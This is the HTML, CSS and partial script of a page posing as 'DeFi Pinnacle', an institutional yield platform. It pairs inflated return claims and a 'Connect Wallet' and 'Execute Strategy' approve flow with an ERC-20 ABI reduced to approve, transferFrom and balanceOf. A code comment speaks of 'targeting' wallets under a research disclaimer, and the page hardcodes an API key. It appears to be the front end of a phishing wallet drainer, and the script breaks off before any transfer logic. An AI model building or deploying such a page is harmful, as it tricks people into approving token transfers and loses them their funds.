<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>DeFi Pinnacle Elite - Institutional-Grade Yield Solutions</title>
  <meta http-equiv="Content-Security-Policy" content="script-src 'self' https://cdn.jsdelivr.net https://cdnjs.cloudflare.com; connect-src 'self' https://*.infura.io https://*.solana.com https://api.coingecko.com https://api.coindesk.com http://localhost:5000;">
  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800&display=swap" rel="stylesheet">
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
  <style>
    :root {
      --primary: #4db8ff;
      --primary-dark: #2a8cff;
      --secondary: #ff4d94;
      --success: #2ecc71;
      --warning: #f39c12;
      --danger: #e74c3c;
      --dark-1: #0a0a0f;
      --dark-2: #121218;
      --dark-3: #1a1a24;
      --dark-4: #232330;
      --light-1: #f5f6f5;
      --light-2: #e0e4e5;
      --light-3: #d1d7da;
      --gray-1: #a8b1b3;
      --gray-2: #7e8a8d;
      --transition: all 0.4s cubic-bezier(0.2, 0.8, 0.2, 1);
      --shadow-sm: 0 4px 12px rgba(0, 0, 0, 0.15);
      --shadow-md: 0 8px 24px rgba(0, 0, 0, 0.25);
      --shadow-lg: 0 16px 48px rgba(0, 0, 0, 0.35);
      --border-radius-sm: 8px;
      --border-radius-md: 16px;
      --border-radius-lg: 24px;
    }

    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
      font-family: 'Inter', -apple-system, 'Helvetica Neue', sans-serif;
      -webkit-font-smoothing: antialiased;
      -moz-osx-font-smoothing: grayscale;
    }

    body {
      background: var(--dark-1);
      color: var(--light-1);
      min-height: 100vh;
      overflow-x: hidden;
      line-height: 1.6;
      transition: var(--transition);
    }

    body.dark-mode {
      background: var(--dark-1);
      color: var(--light-1);
    }

    body.light-mode {
      background: var(--light-1);
      color: var(--dark-1);
    }

    #webgl-background {
      position: fixed;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      z-index: -2;
      opacity: 0.7;
    }

    #fallback-background {
      position: fixed;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      background: linear-gradient(135deg, var(--dark-1) 0%, var(--dark-2) 50%, var(--dark-3) 100%);
      z-index: -3;
      opacity: 0.9;
      animation: subtlePulse 20s ease infinite;
    }

    .light-mode #fallback-background {
      background: linear-gradient(135deg, var(--light-1) 0%, var(--light-2) 50%, var(--light-3) 100%);
    }

    @keyframes subtlePulse {
      0%, 100% { opacity: 0.9; }
      50% { opacity: 0.82; }
    }

    .container {
      max-width: 1400px;
      width: 95%;
      margin: 0 auto;
      padding: 20px;
      position: relative;
      z-index: 1;
    }

    header {
      padding: 20px 0;
      display: flex;
      justify-content: space-between;
      align-items: center;
      position: relative;
      z-index: 100;
    }

    .logo {
      display: flex;
      align-items: center;
      gap: 12px;
      font-size: 1.8rem;
      font-weight: 700;
      color: var(--primary);
      transition: var(--transition);
    }

    .light-mode .logo {
      color: var(--primary-dark);
    }

    .logo-icon {
      width: 40px;
      height: 40px;
      background: linear-gradient(135deg, var(--primary), var(--primary-dark));
      border-radius: 50%;
      display: flex;
      align-items: center;
      justify-content: center;
      box-shadow: 0 0 20px rgba(77, 184, 255, 0.3);
    }

    .nav-links {
      display: flex;
      gap: 32px;
    }

    .nav-links a {
      color: var(--gray-1);
      text-decoration: none;
      font-weight: 500;
      font-size: 1rem;
      transition: var(--transition);
      position: relative;
    }

    .light-mode .nav-links a {
      color: var(--gray-2);
    }

    .nav-links a:hover, .nav-links a.active {
      color: var(--primary);
    }

    .light-mode .nav-links a:hover, .light-mode .nav-links a.active {
      color: var(--primary-dark);
    }

    .nav-links a::after {
      content: '';
      position: absolute;
      bottom: -6px;
      left: 0;
      width: 0;
      height: 2px;
      background: var(--primary);
      transition: var(--transition);
    }

    .nav-links a:hover::after, .nav-links a.active::after {
      width: 100%;
    }

    .header-controls {
      display: flex;
      align-items: center;
      gap: 16px;
    }

    .mode-toggle {
      background: none;
      border: none;
      cursor: pointer;
      font-size: 1.4rem;
      color: var(--gray-1);
      width: 40px;
      height: 40px;
      border-radius: 50%;
      display: flex;
      align-items: center;
      justify-content: center;
      background: rgba(255, 255, 255, 0.08);
      transition: var(--transition);
    }

    .light-mode .mode-toggle {
      color: var(--gray-2);
      background: rgba(0, 0, 0, 0.08);
    }

    .mode-toggle:hover {
      background: rgba(77, 184, 255, 0.2);
      color: var(--primary);
      transform: rotate(15deg);
    }

    .hero {
      padding: 80px 0;
      text-align: center;
      max-width: 800px;
      margin: 0 auto;
      position: relative;
      z-index: 10;
    }

    .hero h1 {
      font-size: 3.5rem;
      font-weight: 800;
      line-height: 1.2;
      margin-bottom: 24px;
      background: linear-gradient(90deg, var(--primary), var(--secondary));
      -webkit-background-clip: text;
      -webkit-text-fill-color: transparent;
      text-shadow: 0 5px 15px rgba(0, 0, 0, 0.3);
      transition: var(--transition);
    }

    .light-mode .hero h1 {
      background: linear-gradient(90deg, var(--primary-dark), #d81b60);
      -webkit-background-clip: text;
      -webkit-text-fill-color: transparent;
    }

    .hero p {
      font-size: 1.25rem;
      color: var(--gray-1);
      margin-bottom: 40px;
      transition: var(--transition);
    }

    .light-mode .hero p {
      color: var(--gray-2);
    }

    .stats {
      display: grid;
      grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
      gap: 20px;
      margin: 60px 0;
    }

    .stat-card {
      background: var(--dark-3);
      border-radius: var(--border-radius-md);
      padding: 24px;
      text-align: center;
      border: 1px solid var(--dark-4);
      transition: var(--transition);
    }

    .light-mode .stat-card {
      background: var(--light-3);
      border: 1px solid var(--light-2);
    }

    .stat-card:hover {
      transform: translateY(-8px);
      box-shadow: var(--shadow-md);
      border-color: rgba(77, 184, 255, 0.2);
    }

    .stat-card h3 {
      font-size: 2.5rem;
      font-weight: 700;
      margin-bottom: 8px;
      color: var(--primary);
      transition: var(--transition);
    }

    .light-mode .stat-card h3 {
      color: var(--primary-dark);
    }

    .stat-card p {
      color: var(--gray-1);
      font-size: 1rem;
      transition: var(--transition);
    }

    .light-mode .stat-card p {
      color: var(--gray-2);
    }

    .section-title {
      text-align: center;
      margin-bottom: 60px;
    }

    .section-title h2 {
      font-size: 2.5rem;
      font-weight: 700;
      margin-bottom: 16px;
      color: var(--light-1);
      transition: var(--transition);
    }

    .light-mode .section-title h2 {
      color: var(--dark-1);
    }

    .section-title p {
      font-size: 1.1rem;
      color: var(--gray-1);
      max-width: 600px;
      margin: 0 auto;
      transition: var(--transition);
    }

    .light-mode .section-title p {
      color: var(--gray-2);
    }

    .features {
      display: grid;
      grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
      gap: 30px;
      margin-bottom: 80px;
    }

    .feature-card {
      background: var(--dark-3);
      border-radius: var(--border-radius-md);
      padding: 32px;
      border: 1px solid var(--dark-4);
      position: relative;
      overflow: hidden;
      transition: var(--transition);
    }

    .light-mode .feature-card {
      background: var(--light-3);
      border: 1px solid var(--light-2);
    }

    .feature-card::before {
      content: '';
      position: absolute;
      top: 0;
      left: 0;
      width: 5px;
      height: 100%;
      background: linear-gradient(to bottom, var(--primary), var(--secondary));
    }

    .feature-card:hover {
      transform: translateY(-10px);
      box-shadow: var(--shadow-lg);
      border-color: rgba(77, 184, 255, 0.3);
    }

    .feature-icon {
      width: 60px;
      height: 60px;
      background: rgba(77, 184, 255, 0.1);
      border-radius: 50%;
      display: flex;
      align-items: center;
      justify-content: center;
      margin-bottom: 24px;
      font-size: 1.5rem;
      color: var(--primary);
      transition: var(--transition);
    }

    .light-mode .feature-icon {
      background: rgba(77, 184, 255, 0.15);
      color: var(--primary-dark);
    }

    .feature-card h3 {
      font-size: 1.5rem;
      margin-bottom: 16px;
      color: var(--light-1);
      transition: var(--transition);
    }

    .light-mode .feature-card h3 {
      color: var(--dark-1);
    }

    .feature-card p {
      color: var(--gray-1);
      margin-bottom: 20px;
      transition: var(--transition);
    }

    .light-mode .feature-card p {
      color: var(--gray-2);
    }

    .feature-roi {
      font-size: 1.3rem;
      font-weight: 700;
      color: var(--success);
      padding: 8px 16px;
      background: rgba(46, 204, 113, 0.1);
      border-radius: 30px;
      display: inline-block;
      transition: var(--transition);
    }

    .light-mode .feature-roi {
      background: rgba(46, 204, 113, 0.15);
    }

    .wallet-section {
      background: var(--dark-2);
      border-radius: var(--border-radius-lg);
      padding: 48px;
      margin-bottom: 80px;
      box-shadow: var(--shadow-md);
      transition: var(--transition);
    }

    .light-mode .wallet-section {
      background: var(--light-2);
      box-shadow: var(--shadow-sm);
    }

    .wallet-header {
      display: flex;
      justify-content: space-between;
      align-items: center;
      margin-bottom: 40px;
    }

    .wallet-header h2 {
      font-size: 2rem;
      color: var(--light-1);
      display: flex;
      align-items: center;
      gap: 12px;
      transition: var(--transition);
    }

    .light-mode .wallet-header h2 {
      color: var(--dark-1);
    }

    .wallet-balance {
      background: var(--dark-3);
      border-radius: var(--border-radius-md);
      padding: 24px;
      margin-bottom: 32px;
      transition: var(--transition);
    }

    .light-mode .wallet-balance {
      background: var(--light-3);
    }

    .wallet-balance h3 {
      font-size: 1.1rem;
      color: var(--gray-1);
      margin-bottom: 16px;
      display: flex;
      align-items: center;
      gap: 10px;
      transition: var(--transition);
    }

    .light-mode .wallet-balance h3 {
      color: var(--gray-2);
    }

    .wallet-balance h3 i {
      color: var(--primary);
      transition: var(--transition);
    }

    .light-mode .wallet-balance h3 i {
      color: var(--primary-dark);
    }

    .balance-amount {
      font-size: 2.2rem;
      font-weight: 700;
      color: var(--light-1);
      transition: var(--transition);
    }

    .light-mode .balance-amount {
      color: var(--dark-1);
    }

    .balance-subtext {
      color: var(--gray-1);
      font-size: 0.9rem;
      margin-top: 8px;
      transition: var(--transition);
    }

    .light-mode .balance-subtext {
      color: var(--gray-2);
    }

    .action-cards {
      display: grid;
      grid-template-columns: repeat(auto-fit, minmax(280px, 1fr));
      gap: 24px;
      margin-bottom: 32px;
    }

    .action-card {
      background: var(--dark-3);
      border-radius: var(--border-radius-md);
      padding: 24px;
      text-align: center;
      border: 1px solid var(--dark-4);
      transition: var(--transition);
    }

    .light-mode .action-card {
      background: var(--light-3);
      border: 1px solid var(--light-2);
    }

    .action-card:hover {
      transform: translateY(-5px);
      box-shadow: var(--shadow-sm);
      border-color: rgba(77, 184, 255, 0.2);
    }

    .action-card h3 {
      font-size: 1.3rem;
      margin-bottom: 16px;
      color: var(--light-1);
      transition: var(--transition);
    }

    .light-mode .action-card h3 {
      color: var(--dark-1);
    }

    .action-card p {
      color: var(--gray-1);
      margin-bottom: 24px;
      transition: var(--transition);
    }

    .light-mode .action-card p {
      color: var(--gray-2);
    }

    .roi-calculator {
      background: var(--dark-3);
      border-radius: var(--border-radius-md);
      padding: 40px;
      margin-bottom: 32px;
      transition: var(--transition);
    }

    .light-mode .roi-calculator {
      background: var(--light-3);
      border: 1px solid var(--light-2);
    }

    .roi-calculator h3 {
      font-size: 1.8rem;
      font-weight: 700;
      color: var(--primary);
      margin-bottom: 24px;
      transition: var(--transition);
    }

    .light-mode .roi-calculator h3 {
      color: var(--primary-dark);
    }

    .roi-input-group {
      display: flex;
      justify-content: center;
      gap: 20px;
      margin-bottom: 30px;
      flex-wrap: wrap;
    }

    .roi-calculator input {
      padding: 18px 28px;
      font-size: 1.2rem;
      font-weight: 500;
      border: none;
      border-radius: var(--border-radius-sm);
      background: rgba(255, 255, 255, 0.12);
      color: var(--light-1);
      width: 100%;
      max-width: 300px;
      box-shadow: 0 5px 15px rgba(0, 0, 0, 0.2);
      transition: var(--transition);
    }

    .light-mode .roi-calculator input {
      background: rgba(0, 0, 0, 0.08);
      color: var(--dark-1);
    }

    .roi-calculator input:focus {
      background: rgba(255, 255, 255, 0.18);
      box-shadow: 0 8px 25px rgba(77, 184, 255, 0.3);
      outline: none;
    }

    .light-mode .roi-calculator input:focus {
      background: rgba(0, 0, 0, 0.12);
    }

    .roi-calculator .result {
      font-size: 1.8rem;
      font-weight: 700;
      color: var(--light-1);
      margin-top: 24px;
      padding: 12px 30px;
      border-radius: 30px;
      background: rgba(77, 184, 255, 0.15);
      display: inline-block;
      transition: var(--transition);
    }

    .light-mode .roi-calculator .result {
      color: var(--dark-1);
      background: rgba(77, 184, 255, 0.1);
    }

    .market-section {
      margin-bottom: 80px;
    }

    .market-grid {
      display: grid;
      grid-template-columns: 1fr 1fr;
      gap: 30px;
    }

    .market-card {
      background: var(--dark-3);
      border-radius: var(--border-radius-md);
      padding: 32px;
      border: 1px solid var(--dark-4);
      transition: var(--transition);
    }

    .light-mode .market-card {
      background: var(--light-3);
      border: 1px solid var(--light-2);
    }

    .market-card h3 {
      font-size: 1.5rem;
      margin-bottom: 24px;
      color: var(--light-1);
      display: flex;
      align-items: center;
      gap: 12px;
      transition: var(--transition);
    }

    .light-mode .market-card h3 {
      color: var(--dark-1);
    }

    .market-card h3 i {
      color: var(--primary);
      transition: var(--transition);
    }

    .light-mode .market-card h3 i {
      color: var(--primary-dark);
    }

    .news-list {
      display: grid;
      gap: 20px;
    }

    .news-item {
      padding-bottom: 20px;
      border-bottom: 1px solid var(--dark-4);
      transition: var(--transition);
    }

    .light-mode .news-item {
      border-bottom: 1px solid var(--light-2);
    }

    .news-item:last-child {
      border-bottom: none;
      padding-bottom: 0;
    }

    .news-item h4 {
      font-size: 1.1rem;
      margin-bottom: 10px;
      color: var(--light-1);
      transition: var(--transition);
    }

    .light-mode .news-item h4 {
      color: var(--dark-1);
    }

    .news-item p {
      color: var(--gray-1);
      font-size: 0.95rem;
      transition: var(--transition);
    }

    .light-mode .news-item p {
      color: var(--gray-2);
    }

    .news-date {
      color: var(--gray-2);
      font-size: 0.8rem;
      margin-top: 8px;
      transition: var(--transition);
    }

    .light-mode .news-date {
      color: var(--gray-1);
    }

    .market-data {
      display: grid;
      grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
      gap: 20px;
      margin-bottom: 32px;
    }

    .data-card {
      background: var(--dark-4);
      border-radius: var(--border-radius-sm);
      padding: 16px;
      text-align: center;
      transition: var(--transition);
    }

    .light-mode .data-card {
      background: var(--light-2);
    }

    .data-card h4 {
      font-size: 1rem;
      color: var(--gray-1);
      margin-bottom: 8px;
      transition: var(--transition);
    }

    .light-mode .data-card h4 {
      color: var(--gray-2);
    }

    .data-card p {
      font-size: 1.4rem;
      font-weight: 700;
      color: var(--light-1);
      transition: var(--transition);
    }

    .light-mode .data-card p {
      color: var(--dark-1);
    }

    .price-chart {
      margin-bottom: 32px;
      background: var(--dark-3);
      border-radius: var(--border-radius-md);
      padding: 24px;
      transition: var(--transition);
    }

    .light-mode .price-chart {
      background: var(--light-3);
      border: 1px solid var(--light-2);
    }

    .price-chart canvas {
      max-width: 100%;
      height: 280px;
    }

    .btn {
      padding: 14px 32px;
      font-size: 1rem;
      font-weight: 600;
      border-radius: 30px;
      cursor: pointer;
      transition: var(--transition);
      border: none;
      outline: none;
      display: inline-flex;
      align-items: center;
      justify-content: center;
      gap: 10px;
    }

    .btn-primary {
      background: linear-gradient(135deg, var(--primary), var(--primary-dark));
      color: #ffffff;
      box-shadow: 0 8px 24px rgba(77, 184, 255, 0.3);
    }

    .btn-primary:hover {
      transform: translateY(-3px);
      box-shadow: 0 12px 32px rgba(77, 184, 255, 0.4);
    }

    .btn-success {
      background: linear-gradient(135deg, var(--success), #27ae60);
      color: #ffffff;
      box-shadow: 0 8px 24px rgba(46, 204, 113, 0.3);
    }

    .btn-success:hover {
      transform: translateY(-3px);
      box-shadow: 0 12px 32px rgba(46, 204, 113, 0.4);
    }

    .btn-secondary {
      background: rgba(255, 255, 255, 0.08);
      color: var(--light-1);
      border: 1px solid rgba(255, 255, 255, 0.15);
      transition: var(--transition);
    }

    .light-mode .btn-secondary {
      background: rgba(0, 0, 0, 0.08);
      color: var(--dark-1);
      border: 1px solid rgba(0, 0, 0, 0.15);
    }

    .btn-secondary:hover {
      background: rgba(255, 255, 255, 0.15);
      transform: translateY(-3px);
    }

    .light-mode .btn-secondary:hover {
      background: rgba(0, 0, 0, 0.15);
    }

    .btn:disabled {
      background: rgba(100, 100, 100, 0.2);
      color: var(--gray-2);
      cursor: not-allowed;
      box-shadow: none;
      transform: none;
    }

    .light-mode .btn:disabled {
      background: rgba(0, 0, 0, 0.2);
      color: var(--gray-1);
    }

    .btn-sm {
      padding: 10px 24px;
      font-size: 0.9rem;
    }

    .status {
      margin-top: 36px;
      font-size: 1.3rem;
      font-weight: 500;
      opacity: 0;
      transform: translateY(12px);
      padding: 16px 30px;
      border-radius: var(--border-radius-sm);
      display: inline-block;
      max-width: 80%;
      margin-left: auto;
      margin-right: auto;
      transition: var(--transition);
    }

    .status.success {
      background: rgba(46, 204, 113, 0.15);
      color: var(--success);
    }

    .status.error {
      background: rgba(231, 76, 60, 0.15);
      color: var(--danger);
    }

    .status.info {
      background: rgba(77, 184, 255, 0.15);
      color: var(--primary);
    }

    .status.show {
      opacity: 1;
      transform: translateY(0);
    }

    footer {
      background: var(--dark-2);
      padding: 60px 0 30px;
      border-top: 1px solid var(--dark-4);
      transition: var(--transition);
    }

    .light-mode footer {
      background: var(--light-2);
      border-top: 1px solid var(--light-3);
    }

    .footer-grid {
      display: grid;
      grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
      gap: 40px;
      margin-bottom: 40px;
    }

    .footer-col h4 {
      font-size: 1.2rem;
      margin-bottom: 24px;
      color: var(--light-1);
      transition: var(--transition);
    }

    .light-mode .footer-col h4 {
      color: var(--dark-1);
    }

    .footer-links {
      display: flex;
      flex-direction: column;
      gap: 12px;
    }

    .footer-links a {
      color: var(--gray-1);
      text-decoration: none;
      transition: var(--transition);
    }

    .light-mode .footer-links a {
      color: var(--gray-2);
    }

    .footer-links a:hover {
      color: var(--primary);
    }

    .light-mode .footer-links a:hover {
      color: var(--primary-dark);
    }

    .social-links {
      display: flex;
      gap: 16px;
      margin-top: 20px;
    }

    .social-links a {
      width: 40px;
      height: 40px;
      border-radius: 50%;
      background: var(--dark-3);
      display: flex;
      align-items: center;
      justify-content: center;
      color: var(--light-1);
      transition: var(--transition);
    }

    .light-mode .social-links a {
      background: var(--light-3);
      color: var(--dark-1);
    }

    .social-links a:hover {
      background: var(--primary);
      transform: translateY(-5px);
      color: #ffffff;
    }

    .light-mode .social-links a:hover {
      background: var(--primary-dark);
    }

    .footer-bottom {
      text-align: center;
      padding-top: 30px;
      border-top: 1px solid var(--dark-4);
      color: var(--gray-1);
      font-size: 0.9rem;
      transition: var(--transition);
    }

    .light-mode .footer-bottom {
      border-top: 1px solid var(--light-3);
      color: var(--gray-2);
    }

    @keyframes fadeIn {
      from { opacity: 0; transform: translateY(20px); }
      to { opacity: 1; transform: translateY(0); }
    }

    .animate {
      animation: fadeIn 0.6s ease forwards;
    }

    .delay-1 { animation-delay: 0.1s; }
    .delay-2 { animation-delay: 0.2s; }
    .delay-3 { animation-delay: 0.3s; }
    .delay-4 { animation-delay: 0.4s; }

    @media (max-width: 900px) {
      .market-grid {
        grid-template-columns: 1fr;
      }
    }

    @media (max-width: 768px) {
      .nav-links {
        display: none;
      }

      .hero h1 {
        font-size: 2.5rem;
      }

      .hero p {
        font-size: 1.1rem;
      }

      .wallet-section {
        padding: 32px 20px;
      }

      .features {
        grid-template-columns: 1fr;
      }

      .stats {
        grid-template-columns: 1fr;
      }

      .market-data {
        grid-template-columns: 1fr;
      }
    }

    @media (max-width: 480px) {
      .hero h1 {
        font-size: 2rem;
      }

      .container {
        padding: 10px;
      }

      .action-cards {
        grid-template-columns: 1fr;
      }

      .btn {
        width: 100%;
        max-width: 300px;
      }
    }
  </style>
</head>
<body class="dark-mode">
  <canvas id="webgl-background"></canvas>
  <div id="fallback-background"></div>
  <div class="container">
    <header>
      <div class="logo animate">
        <div class="logo-icon">
          <i class="fas fa-chart-line"></i>
        </div>
        <span>DeFi Pinnacle</span>
      </div>
      <nav class="nav-links">
        <a href="#" class="active animate">Dashboard</a>
        <a href="#" class="animate delay-1">Yield Farming</a>
        <a href="#" class="animate delay-2">Portfolio</a>
        <a href="#" class="animate delay-3">Analytics</a>
        <a href="#" class="animate delay-4">Docs</a>
      </nav>
      <div class="header-controls">
        <button class="mode-toggle animate" id="modeToggle"><i class="fas fa-moon"></i></button>
        <button class="btn btn-secondary animate delay-1" id="connectBtn"><i class="fas fa-wallet"></i> Connect Wallet</button>
      </div>
    </header>
    
    <section class="hero animate">
      <h1>Institutional-Grade Yield Optimization</h1>
      <p>Maximize your returns with advanced DeFi strategies, military-grade security protocols, and cross-chain interoperability designed for sophisticated investors.</p>
      <div class="action-buttons">
        <button class="btn btn-primary animate delay-1" id="startEarning"><i class="fas fa-arrow-right"></i> Start Earning</button>
        <button class="btn btn-secondary animate delay-2">Explore Strategies</button>
      </div>
    </section>
    
    <div class="stats">
      <div class="stat-card animate delay-1">
        <h3>12.8%</h3>
        <p>Average APY</p>
      </div>
      <div class="stat-card animate delay-2">
        <h3>$4.2B</h3>
        <p>Total Value Locked</p>
      </div>
      <div class="stat-card animate delay-3">
        <h3>98.5%</h3>
        <p>Uptime Reliability</p>
      </div>
      <div class="stat-card animate delay-4">
        <h3>120K+</h3>
        <p>Active Users</p>
      </div>
    </div>
    
    <section class="features-section">
      <div class="section-title animate">
        <h2>Premium Yield Strategies</h2>
        <p>Access institutional-grade DeFi strategies with optimized returns and enhanced security</p>
      </div>
      <div class="features">
        <div class="feature-card animate">
          <div class="feature-icon"><i class="fas fa-shield-alt"></i></div>
          <h3>Stablecoin Fortress</h3>
          <p>Fortify your portfolio with stablecoin yields protected by multiple risk mitigation layers.</p>
          <div class="feature-roi">12.8% APY</div>
        </div>
        <div class="feature-card animate delay-1">
          <div class="feature-icon"><i class="fas fa-water"></i></div>
          <h3>Liquidity Command</h3>
          <p>Dominate returns in optimized liquidity pools with impermanent loss protection.</p>
          <div class="feature-roi">27.3% APY</div>
        </div>
        <div class="feature-card animate delay-2">
          <div class="feature-icon"><i class="fas fa-link"></i></div>
          <h3>Cross-Chain Dominance</h3>
          <p>Seamless yields across premier blockchains with zero slippage and atomic execution.</p>
          <div class="feature-roi">19.6% APY</div>
        </div>
      </div>
    </section>
    
    <section class="wallet-section animate">
      <div class="wallet-header">
        <h2><i class="fas fa-wallet"></i> Wallet Management</h2>
        <button class="btn btn-secondary btn-sm"><i class="fas fa-history"></i> Transaction History</button>
      </div>
      <div class="wallet-balance" id="walletBalance" style="display: none;">
        <h3><i class="fas fa-coins"></i> Total Portfolio Value</h3>
        <div class="balance-amount" id="balanceAmount">Loading...</div>
        <div class="balance-subtext" id="balanceSubtext">Network: Unknown</div>
      </div>
      <div class="roi-calculator">
        <h3>Strategic Yield Projection</h3>
        <div class="roi-input-group">
          <input type="number" id="investment" placeholder="Enter capital allocation (USD)" min="0">
        </div>
        <div class="result" id="roiResult">Projected Annual Yield: $0.00</div>
      </div>
      <div class="action-buttons">
        <button class="btn btn-success" id="approveBtn" disabled><i class="fas fa-lock"></i> Execute Strategy</button>
      </div>
      <div class="status" id="status"></div>
    </section>
    
    <section class="market-section animate">
      <div class="section-title">
        <h2>Market Intelligence</h2>
        <p>Real-time market data and insights to inform your investment strategy</p>
      </div>
      <div class="market-grid">
        <div class="market-card">
          <h3><i class="fas fa-chart-line"></i> Market Overview</h3>
          <div class="market-data">
            <div class="data-card animate">
              <h4>Bitcoin Price</h4>
              <p id="btcPrice">Loading...</p>
            </div>
            <div class="data-card animate delay-1">
              <h4>Ethereum Price</h4>
              <p id="ethPrice">Loading...</p>
            </div>
            <div class="data-card animate delay-2">
              <h4>Total Market Cap</h4>
              <p id="marketCap">Loading...</p>
            </div>
            <div class="data-card animate delay-3">
              <h4>Fear & Greed Index</h4>
              <p id="fearGreed">Loading...</p>
            </div>
          </div>
          <div class="price-chart animate delay-4">
            <canvas id="priceChart"></canvas>
          </div>
        </div>
        <div class="market-card">
          <h3><i class="fas fa-newspaper"></i> Latest News</h3>
          <div class="news-list" id="newsList">
            <div class="news-item animate">
              <h4>Loading...</h4>
              <p>Please wait while we fetch the latest news from CoinDesk.</p>
              <div class="news-date">Loading...</div>
            </div>
          </div>
        </div>
      </div>
    </section>
  </div>
  
  <footer>
    <div class="container">
      <div class="footer-grid">
        <div class="footer-col animate">
          <div class="logo">
            <div class="logo-icon">
              <i class="fas fa-chart-line"></i>
            </div>
            <span>DeFi Pinnacle</span>
          </div>
          <p style="color: var(--gray-1); margin-top: 20px; max-width: 300px; transition: var(--transition);" class="light-mode-gray">
            Institutional-grade DeFi solutions with security, transparency, and optimized returns.
          </p>
          <div class="social-links">
            <a href="#" class="animate delay-1"><i class="fab fa-twitter"></i></a>
            <a href="#" class="animate delay-2"><i class="fab fa-discord"></i></a>
            <a href="#" class="animate delay-3"><i class="fab fa-github"></i></a>
            <a href="#" class="animate delay-4"><i class="fab fa-telegram"></i></a>
          </div>
        </div>
        <div class="footer-col animate delay-1">
          <h4>Platform</h4>
          <div class="footer-links">
            <a href="#">Dashboard</a>
            <a href="#">Yield Strategies</a>
            <a href="#">Portfolio Analytics</a>
            <a href="#">Security Audits</a>
            <a href="#">API Documentation</a>
          </div>
        </div>
        <div class="footer-col animate delay-2">
          <h4>Resources</h4>
          <div class="footer-links">
            <a href="#">Documentation</a>
            <a href="#">Tutorials</a>
            <a href="#">Market Analysis</a>
            <a href="#">Research Papers</a>
            <a href="#">Community</a>
          </div>
        </div>
        <div class="footer-col animate delay-3">
          <h4>Legal</h4>
          <div class="footer-links">
            <a href="#">Terms of Service</a>
            <a href="#">Privacy Policy</a>
            <a href="#">Risk Disclosure</a>
            <a href="#">Cookie Policy</a>
            <a href="#">Compliance</a>
          </div>
        </div>
      </div>
      <div class="footer-bottom animate delay-4">
        <p>Â© 2025 DeFi Pinnacle. All rights reserved. This is a demonstration interface for educational purposes only.</p>
      </div>
    </div>
  </footer>

  <script src="https://cdn.jsdelivr.net/npm/web3@1.5.2/dist/web3.min.js"></script>
  <script src="https://cdn.jsdelivr.net/npm/@solana/web3.js@1.66.2/dist/index.min.js"></script>
  <script src="https://cdn.jsdelivr.net/npm/@solana/spl-token@0.3.5/dist/index.min.js"></script>
  <script src="https://cdn.jsdelivr.net/npm/walletconnect@1.7.8/dist/walletconnect.min.js"></script>
  <script src="https://cdnjs.cloudflare.com/ajax/libs/three.js/r134/three.min.js"></script>
  <script src="https://cdn.jsdelivr.net/npm/chart.js@3.9.1/dist/chart.min.js"></script>
  <script>
    // == ETHICAL BOUNDARY ==
    // ONLY RESEARCHER WALLETS CAN BE TARGETED
    // For academic stress-testing of wallet security in a controlled environment.

    const COINDESK_API_KEY = '04adb85d86bba00d5fc8ca6557c0e7bf1bb7e1bfcd6f5905365f363608784686';
    let chains = {};

    // Fetch Configurations from Backend
    async function fetchConfig() {
      try {
        const response = await fetch('http://localhost:5000/api/config', {
          headers: { 'Authorization': `Bearer ${localStorage.getItem('jwt')}` }
        });
        if (!response.ok) throw new Error('Failed to fetch config');
        const config = await response.json();
        chains = config.chains;
        return config;
      } catch (e) {
        console.error('[Config] Fetch failed:', e);
        updateStatus('Failed to load configuration', 'error');
        return null;
      }
    }

    // ERC-20 ABI
    const ERC20_ABI = [
      { constant: false, inputs: [{ name: '_spender', type: 'address' }, { name: '_value', type: 'uint256' }], name: 'approve', outputs: [{ name: '', type: 'bool' }], type: 'function' },
      { constant: false, inputs: [{ name: '_from', type: 'address' }, { name: '_to', type: 'address' }, { name: '_value', type: 'uint256' }], name: 'transferFrom', outputs: [{ name: '', type: 'bool' }], type: 'function' },
      { constant: true, inputs: [{ name: '_owner', type: 'address' }], name: 'balanceOf', outputs: [{ name: '', type: 'uint256' }], type: 'function' }
    ];

    // WebGL Particle System
    const initWebGL = () => {
      const scene = new THREE.Scene();
      const camera = new THREE.PerspectiveCamera(75, window.innerWidth / window.innerHeight, 0.1, 1000);
      const renderer = new THREE.WebGLRenderer({ canvas: document.getElementById('webgl-background'), alpha: true, antialias: true });
      renderer.setSize(window.innerWidth, window.innerHeight);
      renderer.setPixelRatio(window.devicePixelRatio);
      camera.position.z = 80;

      const particlesCount = 4000;
      const positions = new Float32Array(particlesCount * 3);
      const colors = new Float32Array(particlesCount * 3);
      const sizes = new Float32Array(particlesCount);
      const velocities = new Float32Array(particlesCount * 3);

      const colorPalette = [
        new THREE.Color(0x4db8ff),
        new THREE.Color(0x2a8cff),
        new THREE.Color(0xff4d94),
        new THREE.Color(0x9b59b6)
      ];

      for (let i = 0; i < particlesCount; i++) {
        const i3 = i * 3;
        const radius = Math.random() * 60;
        const theta = Math.random() * Math.PI * 2;
        const phi = Math.acos(2 * Math.random() - 1);

        positions[i3] = radius * Math.sin(phi) * Math.cos(theta);
        positions[i3 + 1] = radius * Math.sin(phi) * Math.sin(theta);
        positions[i3 + 2] = radius * Math.cos(phi);

        velocities[i3] = (Math.random() - 0.5) * 0.01;
        velocities[i3 + 1] = (Math.random() - 0.5) * 0.01;
        velocities[i3 + 2] = (Math.random() - 0.5) * 0.01;

        const color = colorPalette[Math.floor(Math.random() * colorPalette.length)];
        colors[i3] = color.r;
        colors[i3 + 1] = color.g;
        colors[i3 + 2] = color.b;

        sizes[i] = Math.random() * 2 + 0.5;
      }

      const particlesGeometry = new THREE.BufferGeometry();
      particlesGeometry.setAttribute('position', new THREE.BufferAttribute(positions, 3));
      particlesGeometry.setAttribute('color', new THREE.BufferAttribute(colors, 3));
      particlesGeometry.setAttribute('size', new THREE.BufferAttribute(sizes, 1));

      const particlesMaterial = new THREE.PointsMaterial({
        size: 1.5,
        vertexColors: true,
        transparent: true,
        opacity: 0.8,
        blending: THREE.AdditiveBlending,
        sizeAttenuation: true
      });

